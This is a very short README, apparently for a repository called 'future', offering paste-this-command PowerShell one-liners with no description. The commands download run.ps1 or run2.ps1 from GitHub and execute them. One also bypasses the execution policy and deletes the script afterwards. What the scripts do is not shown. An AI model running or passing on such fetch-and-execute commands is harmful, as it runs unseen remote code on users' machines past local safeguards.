# future

gg
```ps1
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression "& { $(Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/yourname1204/future/master/run.ps1') }"
```
```ps1
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yourname1204/future/master/run.ps1" -OutFile "$env:TEMP\run.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\run.ps1"; Remove-Item -Path "$env:TEMP\run.ps1" -Force
```
uk
```ps1
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression "& { $(Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/yourname1204/future/master/run2.ps1') }"
```
